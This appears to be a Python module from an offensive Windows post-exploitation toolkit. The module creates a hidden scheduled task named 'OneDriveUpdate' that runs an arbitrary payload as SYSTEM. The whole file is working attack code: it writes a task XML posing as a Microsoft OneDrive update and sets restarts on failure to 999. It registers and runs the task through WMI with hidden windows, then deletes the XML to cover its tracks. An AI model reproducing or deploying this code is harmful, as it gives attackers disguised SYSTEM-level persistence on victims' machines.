import os
import wmi
import time
import tempfile
import ctypes
from core.prints import *

wmi = wmi.WMI()

def schtask(payload):
	xml_template = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2018-06-09T15:45:11.0109885</Date>
    <Author>000000000000000000</Author>
    <URI>\Microsoft\Windows\OneDriveUpdate</URI>
  </RegistrationInfo>
  <Triggers />
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT2H</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"""+os.path.join(payload)+"""</Command>
    </Exec>
  </Actions>
</Task>"""

	print_info("Payload {}".format(payload))
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		try:
			xml_file = open(os.path.join(tempfile.gettempdir(),"elevator.xml"),"w")
			xml_file.write(xml_template)
			xml_file.close()
		except Exception as error:
			return False
	
		time.sleep(5)
	
		print_info("Attempting to create persistent schtask with SYSTEM privledges")
		if (os.path.isfile(os.path.join(tempfile.gettempdir(),"elevator.xml")) == True):
			create = wmi.Win32_Process.Create(CommandLine="schtasks /create /xml {} /tn OneDriveUpdate".format(os.path.join(tempfile.gettempdir(),"elevator.xml")),
												ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
			
			if (create[1] == 0):
				print_success("Successfully created schtask")
				run = wmi.Win32_Process.Create(CommandLine="schtasks /run /tn OneDriveUpdate",
													ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
				
				print_info("Pausing for 5 seconds before running schtask")
				time.sleep(5)
				
				if (run[1] == 0):
					print_success("Successfully ran schtask")
					try:
						os.remove(os.path.join(tempfile.gettempdir(),"elevator.xml"))
					except Exception as error:
						return False
				else:
					print_error("Unable to run schtask")													
			else:
				print_error("Unable to create schtask")
			
		else:
			print_error("Unable to create schtask, xml template not found")
	else:
		print_error("Unable to create schtask, we are not elevated")